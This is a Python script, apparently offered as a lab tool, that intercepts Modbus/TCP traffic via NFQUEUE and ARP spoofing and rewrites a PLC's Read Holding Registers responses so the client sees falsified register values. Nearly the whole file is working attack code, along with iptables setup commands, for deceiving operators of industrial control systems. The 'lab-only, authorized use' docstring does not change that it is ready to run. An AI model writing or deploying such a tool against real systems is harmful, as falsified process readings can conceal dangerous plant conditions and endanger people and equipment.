#!/usr/bin/env python3
"""
Lab-only Modbus/TCP response morpher (deception).
- Hooks NFQUEUE and modifies *responses* for Read Holding Registers (FC 0x03)
  for a specific (start, count) window.
- No scapy.contrib.modbus dependency; parses MBAP+PDU manually.
- Use *only* in your isolated testbed with proper authorization.

Example:
  sudo sysctl -w net.ipv4.ip_forward=1
  # (set up your ARP spoofing as you already do)
  sudo iptables -t mangle -I PREROUTING  -p tcp --dport 502 -j NFQUEUE --queue-num 1
  sudo iptables -t mangle -I POSTROUTING -p tcp --sport 502 -j NFQUEUE --queue-num 1

  /opt/.venv/bin/python3 overwriter.py \
      --queue 1 --start 40010 --count 2 --add 5 \
      --evidence /captures/modbus_phase3.jsonl

Revert rules when done:
  sudo iptables -t mangle -D PREROUTING  -p tcp --dport 502 -j NFQUEUE --queue-num 1
  sudo iptables -t mangle -D POSTROUTING -p tcp --sport 502 -j NFQUEUE --queue-num 1
"""

import argparse, json, struct, time
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

REQS = {}  # (tid, client_ip, server_ip) -> (start, count)

def mbap_parse(raw: bytes):
    """Return (tid, pid, length, uid, pdu_bytes) or None if malformed."""
    if len(raw) < 7:
        return None
    tid = int.from_bytes(raw[0:2], 'big')
    pid = int.from_bytes(raw[2:4], 'big')
    length = int.from_bytes(raw[4:6], 'big')   # bytes following this field
    uid = raw[6]
    # PDU length should be (length - 1) because UnitID consumes 1
    pdu_len = length - 1
    if pdu_len < 1 or len(raw) < 7 + pdu_len:
        return None
    pdu = raw[7:7 + pdu_len]
    return tid, pid, length, uid, pdu

def mbap_build(tid, pid, uid, pdu: bytes) -> bytes:
    """Rebuild MBAP+PDU bytes."""
    length = 1 + len(pdu)  # UnitID (1) + PDU
    return (tid.to_bytes(2, 'big') +
            pid.to_bytes(2, 'big') +
            length.to_bytes(2, 'big') +
            bytes([uid]) +
            pdu)

def words_from_bytes(b: bytes):
    """Big-endian 16-bit words."""
    if len(b) % 2 != 0:
        return None
    count = len(b) // 2
    return list(struct.unpack(">" + "H"*count, b))

def bytes_from_words(words):
    return struct.pack(">" + "H"*len(words), *words)

def transform_words(words, add=None, set_const=None, clamp_min=None, clamp_max=None):
    if not words:
        return words
    new = words[:]
    if set_const is not None:
        new[0] = set_const & 0xFFFF
    if add is not None:
        new[0] = (new[0] + add) & 0xFFFF
    if clamp_min is not None and new[0] < clamp_min:
        new[0] = clamp_min
    if clamp_max is not None and new[0] > clamp_max:
        new[0] = clamp_max
    return new

def make_logger(evidence_path):
    if not evidence_path:
        return lambda event, **kw: None
    fh = open(evidence_path, "a", buffering=1)
    def _log(event, **kw):
        rec = {"ts": time.time(), "event": event}
        rec.update(kw)
        fh.write(json.dumps(rec) + "\n")
    return _log

def build_handler(args):
    log = make_logger(args.evidence)

    target_start = args.start
    target_count = args.count

    def on_packet(pkt):
        payload = pkt.get_payload()
        ip = IP(payload)
        if not ip.haslayer(TCP) or not ip.haslayer(Raw):
            pkt.accept(); return
        tcp = ip[TCP]
        raw = bytes(tcp.payload)

        # Requests (client -> PLC)
        if tcp.dport == 502 and raw:
            m = mbap_parse(raw)
            if not m:
                pkt.accept(); return
            tid, pid, length, uid, pdu = m
            if pid != 0:  # Modbus/TCP Protocol ID must be 0
                pkt.accept(); return
            func = pdu[0]
            # Read Holding Registers request = 0x03
            if func == 0x03 and len(pdu) >= 5:
                start = int.from_bytes(pdu[1:3], 'big')
                count = int.from_bytes(pdu[3:5], 'big')
                REQS[(tid, ip.src, ip.dst)] = (start, count)
                log("track_request", tid=tid, cli=ip.src, srv=ip.dst,
                    func=3, start=start, count=count)
            pkt.accept(); return

        # Responses (PLC -> client)
        if tcp.sport == 502 and raw:
            m = mbap_parse(raw)
            if not m:
                pkt.accept(); return
            tid, pid, length, uid, pdu = m
            if pid != 0:
                pkt.accept(); return
            func = pdu[0]
            # Read Holding Registers response = 0x03
            if func == 0x03 and len(pdu) >= 2:
                key = (tid, ip.dst, ip.src)  # reverse (client,server)
                meta = REQS.pop(key, None)
                if meta is None:
                    pkt.accept(); return
                start, count = meta
                # Only touch our chosen window
                if start == target_start and count == target_count:
                    byte_count = pdu[1]
                    data = pdu[2:2+byte_count]
                    words = words_from_bytes(data)
                    if words and len(words) == count:
                        before = words[:]
                        words = transform_words(
                            words,
                            add=args.add,
                            set_const=args.set,
                            clamp_min=args.clamp_min,
                            clamp_max=args.clamp_max
                        )
                        after = words[:]
                        new_data = bytes_from_words(words)
                        new_pdu = bytes([0x03, len(new_data)]) + new_data
                        new_raw = mbap_build(tid, pid, uid, new_pdu)

                        # Replace TCP payload and recompute checksums
                        tcp.remove_payload()
                        tcp.add_payload(new_raw)
                        # Let scapy recompute sums/lengths
                        for fld in ("len","chksum"):
                            if hasattr(ip, fld): delattr(ip, fld)
                        if hasattr(tcp, "chksum"): delattr(tcp, "chksum")

                        pkt.set_payload(bytes(ip))
                        log("overwrite",
                            tid=tid, cli=ip.dst, srv=ip.src,
                            start=start, count=count,
                            before=before, after=after)
            pkt.accept(); return

        pkt.accept()

    return on_packet

def main():
    ap = argparse.ArgumentParser(description="Modbus/TCP ReadHoldingRegisters response overwriter (NFQUEUE).")
    ap.add_argument("--queue", type=int, default=1, help="NFQUEUE number (default: 1)")
    ap.add_argument("--start", type=int, required=True, help="Target start address (holding register)")
    ap.add_argument("--count", type=int, required=True, help="Target register count")
    ap.add_argument("--set", type=int, help="Set first register to constant value (0..65535)")
    ap.add_argument("--add", type=int, help="Add delta to first register (signed int)")
    ap.add_argument("--clamp-min", type=int, help="Clamp minimum (optional)")
    ap.add_argument("--clamp-max", type=int, help="Clamp maximum (optional)")
    ap.add_argument("--evidence", help="Path to JSONL evidence log (optional)")
    args = ap.parse_args()

    if args.set is None and args.add is None:
        ap.error("Provide at least one of --set or --add")

    nfq = NetfilterQueue()
    handler = build_handler(args)
    nfq.bind(args.queue, handler)
    try:
        print(f"[+] NFQUEUE bound on {args.queue}. Target window {args.start}+{args.count}, "
              f"action={'set='+str(args.set) if args.set is not None else 'add='+str(args.add)}")
        nfq.run()
    finally:
        nfq.unbind()

if __name__ == "__main__":
    main()
